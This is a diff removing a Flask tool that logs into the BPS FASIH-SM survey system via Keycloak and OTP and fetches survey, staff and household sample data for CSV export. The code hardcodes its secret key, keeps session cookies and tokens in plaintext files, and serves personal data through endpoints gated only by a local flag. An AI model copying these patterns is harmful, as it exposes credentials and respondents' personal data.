@@ -1,1045 +1,242 @@
-import requests, copy
-import os, time, json
-from datetime import datetime, timedelta
-from flask import Flask, render_template, request, redirect, flash, url_for, jsonify, session, Response
-from flask_compress import Compress
-from concurrent.futures import ThreadPoolExecutor
-from dotenv import load_dotenv
-from bs4 import BeautifulSoup
-import csv
-import tempfile, uuid
-
-_csv_temp_store = {}
-
-_endpoints = {}
-
-def get_endpoints():
-    global _endpoints
-    if not _endpoints:
-        ep_path = os.path.join(os.path.dirname(__file__), 'endpoints.json')
-        if os.path.exists(ep_path):
-            with open(ep_path, 'r', encoding='utf-8') as f:
-                _endpoints = json.load(f)
-    return _endpoints
-
-def get_api(key, **kwargs):
-    config = get_endpoints()
-    base_url = config.get("BASE_URL", "")
-    ep = config.get("ENDPOINTS", {}).get(key, {})
-    path = ep.get("path", "")
-    if kwargs:
-        path = path.format(**kwargs)
-    url = base_url + path if path.startswith('/') else path
-    return url, ep.get("method", "GET"), ep
-
-app = Flask(__name__, static_url_path='/fasihsm-fetcher/static')
-Compress(app)  # Enable gzip compression for responses
-app.secret_key = 'bebas_aja_yang_penting_aman'
-app.config['APPLICATION_ROOT'] = '/fasihsm-fetcher'
-app.config['PREFERRED_URL_SCHEME'] = 'http'
-
-STATE_FILE    = '.session_state.json'
-SESSION_CACHE = '.session_cache.json'
-STOP_FLAGS_FILE = '.stop_flags.json'
-
-def set_stop_flag(period_id, value):
-    flags = {}
-    if os.path.exists(STOP_FLAGS_FILE):
-        try:
-            with open(STOP_FLAGS_FILE, 'r') as f:
-                flags = json.load(f)
-        except:
-            pass
-    flags[period_id] = value
-    with open(STOP_FLAGS_FILE, 'w') as f:
-        json.dump(flags, f)
-
-def get_stop_flag(period_id):
-    if os.path.exists(STOP_FLAGS_FILE):
-        try:
-            with open(STOP_FLAGS_FILE, 'r') as f:
-                flags = json.load(f)
-                return flags.get(period_id, False)
-        except:
-            return False
-    return False
-
-
-# ── Session State Persistence ─────────────────────────────────────────────────
-
-def save_state(is_running: bool):
-    with open(STATE_FILE, 'w') as f:
-        json.dump({'is_running': is_running}, f)
-
-def load_state() -> bool:
-    if os.path.exists(STATE_FILE):
-        try:
-            with open(STATE_FILE) as f:
-                return json.load(f).get('is_running', False)
-        except:
-            return False
-    return False
-
-def check_session() -> bool:
-    return load_state()
-
-def save_session_cache(cookies: list, csrf: str, user_agent: str, id_token: str = ""):
-    with open(SESSION_CACHE, 'w') as f:
-        json.dump({'cookies': cookies, 'csrf': csrf, 'user_agent': user_agent, 'id_token': id_token}, f)
-
-def load_session_cache() -> dict:
-    if os.path.exists(SESSION_CACHE):
-        try:
-            with open(SESSION_CACHE) as f:
-                return json.load(f)
-        except:
-            pass
-    return {}
-
-def clear_session_cache():
-    for f in [STATE_FILE, SESSION_CACHE]:
-        if os.path.exists(f):
-            os.remove(f)
-
-
-# ── Global pending OTP ────────────────────────────────────────────────────────
-_login_pending = {}  # simpan session requests + form OTP sementara
-
-
-def login_fasih_requests(user, pwd):
-    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36"
-    s = requests.Session()
-    s.headers.update({
-        "User-Agent": UA,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    })
-
-    url_login_page, _, _ = get_api("LOGIN_PAGE")
-    s.get(url_login_page, timeout=15, allow_redirects=True)
-    
-    url_login_auth, _, _ = get_api("LOGIN_AUTH")
-    r_kc = s.get(url_login_auth, timeout=15, allow_redirects=True)
-
-    soup = BeautifulSoup(r_kc.text, 'html.parser')
-    form = soup.find('form')
-    if not form:
-        raise Exception("Form login Keycloak tidak ditemukan. Cek koneksi/VPN.")
-    action_url = form.get('action')
-    if not action_url:
-        raise Exception("Action URL form Keycloak tidak ditemukan.")
-
-    r_login = s.post(action_url, data={"username": user, "password": pwd},
-                     timeout=15, allow_redirects=True)
-
-    # Cek apakah muncul form OTP
-    soup2 = BeautifulSoup(r_login.text, 'html.parser')
-    otp_input = soup2.find('input', {'name': 'otp'}) or soup2.find('input', {'id': 'otp'})
-
-    if otp_input:
-        form2 = soup2.find('form')
-        otp_data = {
-            inp.get('name'): inp.get('value', '')
-            for inp in form2.find_all('input') if inp.get('name')
-        }
-        otp_data.pop('cancel', None)
-        _login_pending['session']    = s
-        _login_pending['otp_action'] = form2.get('action')
-        _login_pending['otp_data']   = otp_data
-        return {"needs_otp": True}
-
-    if "fasih-sm.bps.go.id" not in r_login.url:
-        raise Exception("Login gagal. Cek username/password atau akses VPN BPS.")
-
-    _finalize_login(s, UA)
-    return {"needs_otp": False}
-
-def _finalize_login(s: requests.Session, ua: str):
-    csrf    = s.cookies.get("XSRF-TOKEN", "")
-    cookies = [{"name": c.name, "value": c.value} for c in s.cookies]
-    
-    # Coba ambil ID token dari cookies
-    id_token = ""
-    for c in s.cookies:
-        if "id_token" in c.name.lower() or "token" in c.name.lower():
-            id_token = c.value
-            break
-    
-    save_session_cache(cookies, csrf, ua, id_token)
-    save_state(True)
-
-# ── Helpers ───────────────────────────────────────────────────────────────────
-
-def format_fasih_date(date_str, timezone_label="WITA"):
-    if not date_str or date_str == "-":
-        return "-"
-    tz_offset = {"WIB": 7, "WITA": 8, "WIT": 9}
-    offset = tz_offset.get(timezone_label, 8)
-    try:
-        clean_date = date_str.split(".")[0]
-        if "T" not in clean_date:
-            return date_str
-        dt = datetime.strptime(clean_date, "%Y-%m-%dT%H:%M:%S")
-        dt_local = dt + timedelta(hours=offset)
-        return dt_local.strftime(f"%d %b %Y at %H.%M {timezone_label}")
-    except:
-        try:
-            return f"{date_str[:10]} (Raw)"
-        except:
-            return date_str
-
-def get_req_session():
-    cache = load_session_cache()
-    req_session = requests.Session()
-    if not cache:
-        return req_session
-    for cookie in cache.get('cookies', []):
-        req_session.cookies.set(cookie['name'], cookie['value'])
-    req_session.headers.update({
-        "User-Agent":   cache.get('user_agent', ''),
-        "Accept":       "application/json, text/plain, */*",
-        "X-XSRF-TOKEN": cache.get('csrf', ''),
-    })
-    return req_session
-
-def fetch_list_surveys(req_session, survey_type="Pencacahan", page_size=100):
-    url, meth, ep = get_api("LIST_SURVEYS")
-    url = f"{url}?surveyType={survey_type}"
-    payload = ep.get("default_payload", {}).copy()
-    payload["pageSize"] = page_size
-    try:
-        response = req_session.request(meth, url, json=payload, timeout=15)
-        if response.status_code == 200:
-            return response.json().get('data', {}).get('content', [])
-    except Exception as e:
-        print(f"[fetch_list_surveys] Error: {e}")
-    return []
-
-def fetch_json(req_session, url):
-    try:
-        r = req_session.get(url, timeout=30)
-        r.raise_for_status()
-        res = r.json()
-        return res.get("data") if res.get("data") is not None else {}
-    except Exception as e:
-        print(f"[fetch_json] Error {url}: {e}")
-        return {}
-
-
-# ── Metadata Survei ───────────────────────────────────────────────────────────
-
-def fetch_full_survey_settings_flat(req_session, survey_id):
-    with ThreadPoolExecutor(max_workers=2) as executor:
-        url_det, _, _ = get_api("SURVEY_DETAIL", survey_id=survey_id)
-        url_per, _, _ = get_api("SURVEY_PERIODS", survey_id=survey_id)
-        f_det = executor.submit(fetch_json, req_session, url_det)
-        f_per = executor.submit(fetch_json, req_session, url_per)
-        det = f_det.result()
-        per = f_per.result()
-
-    per_list  = per if isinstance(per, list) else []
-    region_id = det.get("regionGroupId")
-    url_reg, _, _ = get_api("REGION_METADATA", region_id=region_id)
-    reg       = fetch_json(req_session, url_reg) if region_id else {}
-    act_per   = next((p for p in per_list if p.get("isActive")), per_list[0] if per_list else {})
-
-    # Dynamic regional context detection
-    level2_id = None
-    level2_code = None
-    level1_code = None
-    
-    if act_per.get("id"):
-        try:
-            # Source 1: User's info (Very reliable for jurisdiction)
-            # Try fetching with period_id first, then without to get cross-period jurisdiction
-            url_my_base, meth_my, _ = get_api("REGION_MYINFO")
-            url_my = f"{url_my_base}?surveyPeriodId={act_per.get('id')}" if act_per.get("id") else url_my_base
-            my_info = fetch_json(req_session, url_my)
-            
-            d_my = {}
-            if my_info:
-                if my_info.get("success"):
-                    d_my = my_info.get("data", {})
-                else:
-                    d_my = my_info
-            
-            # If no regionId in current period, try fetching WITHOUT period to get all allocations
-            if not d_my.get("regionId") and not d_my.get("allocations"):
-                my_info_all = fetch_json(req_session, url_my_base)
-                if my_info_all:
-                    if my_info_all.get("success"): d_my = my_info_all.get("data", {})
-                    else: d_my = my_info_all
-            
-            if d_my:
-                # regionId or parentRegionCode usually contains the Kabupaten code (e.g. "6309")
-                r_codes = d_my.get("regionId") or []
-                if not r_codes and d_my.get("allocations"):
-                    # Look for ANY parentRegionCode in allocations
-                    r_codes = list(set([a.get("parentRegionCode") for a in d_my.get("allocations") if a.get("parentRegionCode")]))
-                
-                print(f"[Regional Detection] Found r_codes: {r_codes}")
-                
-                if r_codes:
-                    level2_code = str(r_codes[0])
-                    level1_code = level2_code[:2]
-                    
-                    # Now fetch the Kabupaten ID (level2_id) from the code
-                    url_l2, meth_l2, _ = get_api("REGION_LEVEL2")
-                    full_url_l2 = f"{url_l2}?groupId={region_id}&level1FullCode={level1_code}"
-                    res_l2 = req_session.request(meth_l2, full_url_l2)
-                    if res_l2.status_code == 200:
-                        l2_data = res_l2.json().get("data", [])
-                        matching = next((x for x in l2_data if x.get("fullCode") == level2_code), None)
-                        if matching:
-                            level2_id = matching.get("id")
-                            print(f"[Regional Detection] Matched level2_id: {level2_id}")
-            else:
-                print(f"[Regional Detection] MyInfo failed or empty: {my_info}")
-
-            # Source 2: Fallback to peek 1 sample if Source 1 failed
-            if not level2_id and not level2_code:
-                url_s, meth_s, ep_s = get_api("SAMPEL_DATATABLE")
-                payload = copy.deepcopy(ep_s.get("default_payload", {}))
-                payload["assignmentExtraParam"]["surveyPeriodId"] = act_per.get("id")
-                payload["length"] = 1
-                res_s = req_session.request(meth_s, url_s, json=payload, timeout=10)
-                if res_s.status_code == 200:
-                    data_s = res_s.json().get("searchData", [])
-                    if data_s:
-                        reg_info = data_s[0].get("region", {})
-                        lvl1 = reg_info.get("level1", {})
-                        lvl2 = lvl1.get("level2", {})
-                        level1_code = lvl1.get("code")
-                        level2_id = lvl2.get("id")
-                        level2_code = lvl2.get("fullCode")
-        except Exception as e:
-            print(f"[fetch_full_survey_settings_flat] Regional context detection error: {e}")
-
-    return {
-        "judul":          det.get("name", "-"),
-        "tipe":           det.get("surveyType", "-"),
-        "mode":           ", ".join([m.get("mode", "") for m in det.get("surveyModeList", [])]) if det.get("surveyModeList") else "-",
-        "wilayah_ver":    reg.get("groupName", "-"),
-        "level_wilayah":  " > ".join([l.get("name", "") for l in reg.get("level", [])]) if reg.get("level") else "-",
-        "jenis_panel":    "Panel" if det.get("panelType") else "Non-Panel",
-        "jenis_pencacah": "Banyak" if det.get("isMultiPencacah") else "Satu",
-        "periode_aktif":  act_per.get("name", "-"),
-        "tgl_mulai":      format_fasih_date(act_per.get("startDate"), timezone_label="WITA"),
-        "tgl_selesai":    format_fasih_date(act_per.get("endDate"), timezone_label="WITA"),
-        "id_periode":     act_per.get("id", "-"),
-        "group_id":       region_id,
-        "level2_id":      level2_id,
-        "level2_code":    level2_code,
-        "level1_code":    level1_code,
-        "periods":        per_list
-    }
-
-
-# ── Petugas ───────────────────────────────────────────────────────────────────
-
-def fetch_petugas_all_roles(req_session, survey_id, period_id):
-    role_url, role_meth, _ = get_api("SURVEY_ROLES", survey_id=survey_id)
-    try:
-        role_res   = req_session.request(role_meth, role_url, timeout=15)
-        roles_data = role_res.json().get("data", []) if role_res.status_code == 200 else []
-    except:
-        return {"roles": [], "data": {}}
-
-    def fetch_by_role(role):
-        role_id  = role.get("id")
-        api_url, api_meth, ep = get_api("FETCH_PETUGAS")
-        params = ep.get("default_params", {}).copy()
-        params["surveyRoleId"] = role_id
-        params["surveyPeriodId"] = period_id
-
-        try:
-            res = req_session.request(api_meth, api_url, params=params, timeout=15)
-            if res.status_code != 200:
-                print(f"[fetch_by_role] HTTP {res.status_code} for {role_id}")
-                print(f"[fetch_by_role] URL: {res.url}")
-                print(f"[fetch_by_role] Response: {res.text}")
-                return []
-            
-            raw_data = res.json().get("data")
-            if not raw_data:
-                return []
-                
-            rows = []
-            for i, item in enumerate(raw_data.get("content", []), start=1):
-                raw_regions = item.get("regions") or []
-                regions = [r.get("regionCode") for r in raw_regions if r.get("regionCode")]
-                rows.append({
-                    "no":      i,
-                    "nama":    item.get("username") or "-",
-                    "email":   item.get("email") or "-",
-                    "wilayah": ", ".join([str(r) for r in regions]) if regions else "-",
-                    "userId":  item.get("userId")
-                })
-            return rows
-        except Exception as e:
-            print(f"[fetch_by_role] Exception for {role_id}: {e}")
-            return []
-
-    roles_meta = []
-    data = {}
-    with ThreadPoolExecutor(max_workers=len(roles_data) or 1) as executor:
-        futures = {}
-        for role in roles_data:
-            desc = role.get("description", "")
-            key  = desc.lower().replace(" ", "_")
-            roles_meta.append({"key": key, "label": desc})
-            futures[key] = executor.submit(fetch_by_role, role)
-        for key, future in futures.items():
-            data[key] = future.result()
-
-    return {"roles": roles_meta, "data": data}
-
-
-# ── Ringkasan Sampel ──────────────────────────────────────────────────────────
-
-def fetch_sampel_aggregation(req_session, period_id):
-    url, meth, ep = get_api("SAMPEL_DATATABLE")
-    import copy
-    payload = copy.deepcopy(ep.get("default_payload", {}))
-    extra = {
-        **{f"region{i}Id": None for i in range(1, 11)},
-        "surveyPeriodId":         period_id,
-        "assignmentErrorStatusType": -1,
-        "assignmentStatusAlias":  None,
-        **{f"data{i}": None for i in range(1, 11)},
-        "userIdResponsibility": None, "currentUserId": None, "regionId": None
-    }
-    payload["assignmentExtraParam"].update(extra)
-    try:
-        res = req_session.request(meth, url, json=payload, timeout=15)
-        if res.status_code == 200:
-            data = res.json()
-            return {"total": data.get("totalHit", 0), "statuses": data.get("searchAggregation", [])}
-    except Exception as e:
-        print(f"[fetch_sampel_aggregation] {e}")
-    return {"total": 0, "statuses": []}
-
-def _fetch_sampel_generator(req_session, period_id, filters, tz="WITA"):
-    url, meth, ep = get_api("SAMPEL_DATATABLE")
-    all_rows   = []
-    start_idx  = 0
-    draw_count = 1
-    batch_size = 50
-    total_hit  = 1 # dummy initial
-    
-    CHUNK_LIMIT = 1000
-
-    while start_idx < total_hit:
-        chunk_target = min(start_idx + CHUNK_LIMIT, total_hit) if total_hit > 1 else CHUNK_LIMIT
-        
-        while start_idx < chunk_target:
-            import copy
-            payload = copy.deepcopy(ep.get("default_payload", {}))
-            payload["draw"] = draw_count
-            payload["start"] = start_idx
-            payload["length"] = batch_size
-            extra = {
-                **{f"region{i}Id": None for i in range(1, 11)},
-                "surveyPeriodId":         period_id,
-                "assignmentErrorStatusType": -1,
-                "assignmentStatusAlias":  filters.get("status_alias") if filters.get("status_alias") != "SEMUA" else None,
-                **{f"data{i}": None for i in range(1, 11)},
-                "userIdResponsibility": filters.get("user_id"),
-                "currentUserId":        filters.get("user_id"),
-                "userId":               filters.get("user_id"),
-                "regionId":             None
-            }
-            if filters.get("region3Id"): extra["region3Id"] = filters.get("region3Id")
-            if filters.get("region4Id"): extra["region4Id"] = filters.get("region4Id")
-            
-            payload["assignmentExtraParam"].update(extra)
-            print(f"[_fetch_sampel_generator] Fetching start={start_idx}, payload: {json.dumps(payload)}")
-            try:
-                res = req_session.request(meth, url, json=payload, timeout=30)
-                if res.status_code != 200:
-                    start_idx = total_hit
-                    break
-                raw = res.json()
-                
-                total_hit = raw.get("totalHit", 0)
-                if total_hit == 0:
-                    start_idx = total_hit + 1 # Force break
-                    break
-                    
-                if total_hit > 0 and start_idx == 0: # Update total hit on first success
-                    current_total = total_hit
-                
-                chunk_target = min(chunk_target, total_hit) if chunk_target == CHUNK_LIMIT else chunk_target
-                
-                search_data = raw.get("searchData", [])
-                for item in search_data:
-                    reg  = item.get("region", {})
-                    lvl3 = reg.get("level1", {}).get("level2", {}).get("level3", {}) or {}
-                    lvl4 = lvl3.get("level4", {}) or {}
-                    lvl5 = lvl4.get("level5", {}) or {}
-                    lvl6 = lvl5.get("level6", {}) or {}
-                    all_rows.append({
-                        "no":         len(all_rows) + 1,
-                        "id_sls":     item.get("codeIdentity", "-"),
-                        "kk":         item.get("data1") or "-",
-                        "anggota":    item.get("data2") or "-",
-                        "alamat":     item.get("data3") or "-",
-                        "status_kb":  item.get("data4") or "-",
-                        "status_dok": item.get("assignmentStatusAlias", "-"),
-                        "pencacah":   item.get("currentUserFullname") or "-",
-                        "email_pcj":  item.get("currentUserUsername") or "-",
-                        "kec":        f"{lvl3.get('code','-')}. {lvl3.get('name','-')}" if lvl3 else "-",
-                        "des":        f"{lvl4.get('code','-')}. {lvl4.get('name','-')}" if lvl4 else "-",
-                        "sls":        lvl5.get("name", "-") if lvl5 else "-",
-                        "sub_sls":    lvl6.get("code", "-") if lvl6 else "-",
-                        "modified":   format_fasih_date(item.get("dateModified"), timezone_label=tz),
-                        "sample_id":  item.get("id", "-"),
-                        "lat":        item.get("latitude", 0),
-                        "lon":        item.get("longitude", 0),
-                        "created":    format_fasih_date(item.get("dateCreated"), timezone_label=tz),
-                    })
-                start_idx += batch_size
-                draw_count += 1
-                yield {"type": "progress", "progress": min(start_idx, total_hit), "total": total_hit}
-                time.sleep(0.01)
-                
-                if len(search_data) < batch_size:
-                    start_idx = total_hit
-                    break
-            except Exception as e:
-                print(f"[_fetch_sampel_generator] Chunk Error: {e}")
-                start_idx = total_hit
-                break
-                
-        if start_idx < total_hit:
-            time.sleep(1)
-            
-    yield {"type": "done", "rows": all_rows}
-
-
-# ── Download Sampel ───────────────────────────────────────────────────────────
-
-@app.route('/api/sampel-detail-csv', methods=['POST'])
-def api_sampel_detail_csv():
-    if not check_session():
-        return jsonify({"error": "Sesi tidak aktif"}), 401
-    body        = request.get_json()
-    sample_ids  = body.get("sample_ids", [])
-    survey_name = body.get("survey_name", "rincian_sampel")
-    if not sample_ids:
-        return jsonify({"error": "sample_ids kosong"}), 400
-    req_session = get_req_session()
-    total       = len(sample_ids)
-
-    def generate():
-        all_rows = []
-        
-        def fetch_detail(s_id):
-            url, meth, _ = get_api("SAMPEL_DETAIL", s_id=s_id)
-            try:
-                res = req_session.request(meth, url, timeout=15)
-                if res.status_code == 200:
-                    row = parse_detail_sample(res.json())
-                    return row if row else None
-            except Exception as e:
-                print(f"[detail-csv] ERROR {s_id}: {e}")
-            return None
-        
-        # Fetch all samples in parallel (max 5 concurrent requests)
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(fetch_detail, s_id): (i+1, s_id) for i, s_id in enumerate(sample_ids)}
-            completed = 0
-            for future in futures:
-                try:
-                    row = future.result()
-                    if row:
-                        all_rows.append(row)
-                except Exception as e:
-                    print(f"[detail-csv] Fetch error: {e}")
-                completed += 1
-                yield f'data: {{"progress": {completed}, "total": {total}}}\n\n'
-
-        if all_rows:
-            all_keys = []
-            seen = set()
-            for row in all_rows:
-                for k in row.keys():
-                    if k not in seen:
-                        all_keys.append(k)
-                        seen.add(k)
-            token = str(uuid.uuid4())
-            tmp   = tempfile.NamedTemporaryFile(delete=False, suffix='.csv', mode='w',
-                                                encoding='utf-8-sig', newline='')
-            writer = csv.DictWriter(tmp, fieldnames=all_keys, extrasaction='ignore')
-            writer.writeheader()
-            writer.writerows(all_rows)
-            tmp.close()
-            safe_name = survey_name.replace('"', '').replace('/', '-')
-            _csv_temp_store[token] = {"path": tmp.name, "filename": f"{safe_name}.csv"}
-            yield f'data: {{"done": true, "token": "{token}", "filename": "{safe_name}.csv"}}\n\n'
-        else:
-            yield f'data: {{"done": true, "error": "Tidak ada data berhasil diambil"}}\n\n'
-
-    return Response(generate(), mimetype='text/event-stream',
-                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
-
-@app.route('/api/sampel-detail-download/<token>')
-def api_sampel_detail_download(token):
-    entry = _csv_temp_store.pop(token, None)
-    if not entry or not os.path.exists(entry["path"]):
-        return "File tidak ditemukan atau sudah diunduh.", 404
-    def stream_and_delete():
-        try:
-            with open(entry["path"], 'rb') as f:
-                yield from f
-        finally:
-            os.remove(entry["path"])
-    return Response(stream_and_delete(), mimetype='text/csv',
-                    headers={"Content-Disposition": f'attachment; filename="{entry["filename"]}"'})
-
-def parse_detail_sample(json_response):
-    if not json_response or not json_response.get("success"):
-        return None
-    raw_data = json_response.get("data", {})
-    result = {
-        "Sample ID":        raw_data.get("_id"),
-        "ID SLS":           raw_data.get("code_identity"),
-        "Status Dokumen":   raw_data.get("assignment_status_alias"),
-        "Latitude":         raw_data.get("latitude"),
-        "Longitude":        raw_data.get("longitude"),
-        "Petugas Terakhir": raw_data.get("current_user_fullname"),
-    }
-    try:
-        pre_data = json.loads(raw_data.get("pre_defined_data", "{}"))
-        for item in pre_data.get("predata", []):
-            val = item.get("answer")
-            result[f"Prelist_{item.get('dataKey')}"] = str(val) if not isinstance(val, (list, dict)) else json.dumps(val, ensure_ascii=False)
-    except:
-        pass
-    try:
-        content_data = json.loads(raw_data.get("data", "{}"))
-        result["Waktu Submit"] = content_data.get("updatedAt")
-        for ans in content_data.get("answers", []):
-            val = ans.get("answer")
-            if isinstance(val, list):
-                result[f"Ans_{ans.get('dataKey')}"] = ", ".join(
-                    [str(v.get('label', v)) if isinstance(v, dict) else str(v) for v in val])
-            else:
-                result[f"Ans_{ans.get('dataKey')}"] = val
-    except:
-        pass
-    return result
-
-
-# ── Routes ────────────────────────────────────────────────────────────────────
-
-@app.route('/')
-def home():
-    user = session.get('fasih_user') or os.getenv("FASIH_USER")
-    return render_template('index.html', is_running=load_state(), user=user)
-
-@app.route('/import-env', methods=['POST'])
-def import_env():
-    load_dotenv(override=True)
-    user = os.getenv("FASIH_USER")
-    pwd  = os.getenv("FASIH_PASS")
-    if user is None or pwd is None:
-        flash('Warning: File .env tidak ditemukan!', 'danger')
-    elif not user.strip() or not pwd.strip():
-        flash('Isian .env nya salah (kosong)!', 'warning')
-    else:
-        session['fasih_user'] = user
-        flash('Berhasil impor.', 'success')
-    return redirect(url_for('home'))
-
-@app.route('/import-env', methods=['GET'])
-def import_env_get():
-    flash(f"Path {request.path} tidak bisa diakses langsung.", "danger")
-    return redirect(url_for('home'))
-
-# login
-@app.route('/login')
-def login():
-    if load_state():
-        flash("Sesi masih aktif!", "warning")
-        return redirect(url_for('home'))
-    user = os.getenv("FASIH_USER")
-    pwd  = os.getenv("FASIH_PASS")
-    if not user or not pwd:
-        flash("Gagal: Variabel belum diimpor! Klik 'Import .env' dulu.", "danger")
-        return redirect(url_for('home'))
-    try:
-        result = login_fasih_requests(user, pwd)
-        if result.get("needs_otp"):
-            session['needs_otp'] = True
-            flash("Masukkan kode OTP dari aplikasi authenticator.", "info")
-        else:
-            flash("Login sukses. Sesi aktif.", "success")
-    except Exception as e:
-        save_state(False)
-        clear_session_cache()
-        flash(f"Login gagal: {str(e)}", "danger")
-    return redirect(url_for('home'))
-
-# login with otp
-@app.route('/login-otp', methods=['POST'])
-def login_otp():
-    if 'session' not in _login_pending:
-        flash("Tidak ada sesi login pending. Coba login ulang.", "danger")
-        return redirect(url_for('home'))
-
-    otp_code = request.form.get('otp', '').strip()
-    if not otp_code:
-        flash("Kode OTP tidak boleh kosong.", "warning")
-        return redirect(url_for('home'))
-
-    s          = _login_pending['session']
-    otp_action = _login_pending['otp_action']
-    otp_data   = _login_pending['otp_data'].copy()
-    otp_data['otp'] = otp_code
-
-    UA = s.headers.get("User-Agent", "")
-    try:
-        r2 = s.post(otp_action, data=otp_data, timeout=15, allow_redirects=True)
-        if 'fasih-sm.bps.go.id' in r2.url:
-            _finalize_login(s, UA)
-            _login_pending.clear()
-            session.pop('needs_otp', None)
-            flash("Login sukses. Sesi aktif.", "success")
-        else:
-            soup3    = BeautifulSoup(r2.text, 'html.parser')
-            err      = soup3.find(class_='kc-feedback-text') or soup3.find(class_='alert-error')
-            msg      = err.get_text(strip=True) if err else "OTP salah atau expired."
-            flash(f"OTP gagal: {msg}", "danger")
-    except Exception as e:
-        flash(f"Error: {str(e)}", "danger")
-
-    return redirect(url_for('home'))
-
-# logout
-@app.route('/logout')
-def logout():
-    cache = load_session_cache()
-    
-    # Step 1: POST app logout endpoint
-    if cache.get('csrf'):
-        try:
-            s = requests.Session()
-            for cookie in cache.get('cookies', []):
-                s.cookies.set(cookie['name'], cookie['value'])
-            url_logout, meth_logout, _ = get_api("LOGOUT")
-            s.request(meth_logout, url_logout, 
-                   data={'_csrf': cache.get('csrf')}, 
-                   timeout=10, allow_redirects=False)
-        except Exception as e:
-            print(f"[logout] POST app endpoint error: {e}")
-    
-    # Step 2: GET SSO logout endpoint (if ID token available)
-    id_token = cache.get('id_token', '')
-    if id_token:
-        try:
-            sso_base = get_endpoints().get("SSO_LOGOUT_URL", "")
-            sso_logout_url = (
-                f"{sso_base}?id_token_hint={id_token}"
-                f"&post_logout_redirect_uri=http://ui-management-ics.apps.kube.bps.go.id"
-            )
-            requests.get(sso_logout_url, timeout=10, allow_redirects=True)
-        except Exception as e:
-            print(f"[logout] GET SSO endpoint error: {e}")
-    
-    # Step 3: Clear local session
-    save_state(False)
-    clear_session_cache()
-    
-    flash("Logout berhasil.", "info")
-    return redirect(url_for('home'))
-
-@app.route('/secret-wipe')
-def secret_wipe():
-    for key in ["FASIH_USER", "FASIH_PASS"]:
-        os.environ.pop(key, None)
-    session.pop('fasih_user', None)  # ← tambah ini
-    flash("Variabel dihapus!", "warning")
-    return redirect(url_for('home'))
-
-@app.route('/listsurvei')
-@app.route('/listsurvei/<category>')
-@app.route('/listsurvei/<category>/<survey_id>')
-def listsurvei(category="Pencacahan", survey_id=None):
-    if not check_session():
-        flash("Login terlebih dahulu.", "danger")
-        return redirect(url_for('home'))
-    req_session = get_req_session()
-    raw = fetch_list_surveys(req_session, survey_type=category)
-    surveys = []
-    for i, item in enumerate(raw, start=1):
-        surveys.append({
-            "no":           i,
-            "judul_survei": item.get("name", "-"),
-            "id":           item.get("id", "-"),
-            "unit":         item.get("unit", "-"),
-            "dibuat_pada":  format_fasih_date(item.get("createdAt"), timezone_label="WITA")
-        })
-    meta    = None
-    petugas = []
-    if survey_id:
-        meta = fetch_full_survey_settings_flat(req_session, survey_id)
-        req_period = request.args.get("period_id")
-        if req_period:
-            meta["id_periode"] = req_period
-            for p in meta.get("periods", []):
-                if p.get("id") == req_period:
-                    meta["periode_aktif"] = p.get("name")
-                    break
-                    
-        if meta and meta.get("id_periode") and meta["id_periode"] != "-":
-            petugas = fetch_petugas_all_roles(req_session, survey_id, meta["id_periode"])
-    return render_template('listsurvei.html', surveys=surveys, active_cat=category,
-                           meta=meta, selected_id=survey_id, petugas=petugas)
-
-@app.route('/api/sampel-status')
-def api_sampel_status():
-    if not check_session():
-        return jsonify({"error": "Sesi tidak aktif"}), 401
-    period_id = request.args.get("period_id", "")
-    if not period_id:
-        return jsonify({"error": "period_id diperlukan"}), 400
-    return jsonify(fetch_sampel_aggregation(get_req_session(), period_id))
-
-@app.route('/api/sampel-fetch', methods=['POST'])
-def api_sampel_fetch():
-    if not check_session():
-        return jsonify({"error": "Sesi tidak aktif"}), 401
-    body         = request.get_json()
-    period_id    = body.get("period_id", "")
-    filters      = body.get("filters", {})
-    tz           = body.get("tz", "WITA")
-    if not period_id:
-        return jsonify({"error": "period_id diperlukan"}), 400
-        
-    req_session = get_req_session()
-    
-    def generate():
-        for msg in _fetch_sampel_generator(req_session, period_id, filters, tz):
-            if msg["type"] == "progress":
-                yield f'data: {json.dumps({"progress": msg["progress"], "total": msg["total"]})}\n\n'
-            elif msg["type"] == "done":
-                yield f'data: {json.dumps({"done": True, "rows": msg["rows"]})}\n\n'
-
-    return Response(generate(), mimetype='text/event-stream', headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
-
-@app.route('/api/proxy/region/level3')
-def proxy_region_level3():
-    if not check_session(): return jsonify({"error": "Sesi tidak aktif"}), 401
-    group_id = request.args.get("groupId")
-    level2_id = request.args.get("level2Id")
-    if not group_id or not level2_id: return jsonify({"data": []})
-    url, meth, _ = get_api("REGION_LEVEL3")
-    res = get_req_session().request(meth, f"{url}?groupId={group_id}&level2Id={level2_id}")
-    return jsonify(res.json() if res.status_code == 200 else {"data": []})
-
-@app.route('/api/proxy/region/level4')
-def proxy_region_level4():
-    if not check_session(): return jsonify({"error": "Sesi tidak aktif"}), 401
-    group_id = request.args.get("groupId")
-    level3_id = request.args.get("level3Id")
-    if not group_id or not level3_id: return jsonify({"data": []})
-    url, meth, _ = get_api("REGION_LEVEL4")
-    res = get_req_session().request(meth, f"{url}?groupId={group_id}&level3Id={level3_id}")
-    return jsonify(res.json() if res.status_code == 200 else {"data": []})
-
-@app.route('/api/proxy/users')
-def proxy_users():
-    if not check_session(): return jsonify({"error": "Sesi tidak aktif"}), 401
-    period_id = request.args.get("surveyPeriodId")
-    survey_id = request.args.get("surveyId")
-    role_id   = request.args.get("surveyRoleId")
-    region_code = request.args.get("regionCode")
-    
-    req_session = get_req_session()
-    
-    if not role_id and survey_id:
-        try:
-            role_url, role_meth, _ = get_api("SURVEY_ROLES", survey_id=survey_id)
-            r_res = req_session.request(role_meth, role_url, timeout=10)
-            if r_res.status_code == 200:
-                roles = r_res.json().get("data", [])
-                p_role = next((r for r in roles if r.get("isPencacah") or "pencacah" in r.get("name", "").lower()), None)
-                if p_role:
-                    role_id = p_role.get("id")
-        except Exception as e:
-            print(f"[proxy_users] Role detection error: {e}")
-
-    if not period_id or not role_id:
-        return jsonify({"data": []})
-
-    url, meth, _ = get_api("REGION_USERS")
-    params = f"?surveyPeriodId={period_id}&surveyRoleId={role_id}"
-    if region_code and region_code != "None":
-        params += f"&regionCode={region_code}"
-        
-    res = req_session.request(meth, f"{url}{params}")
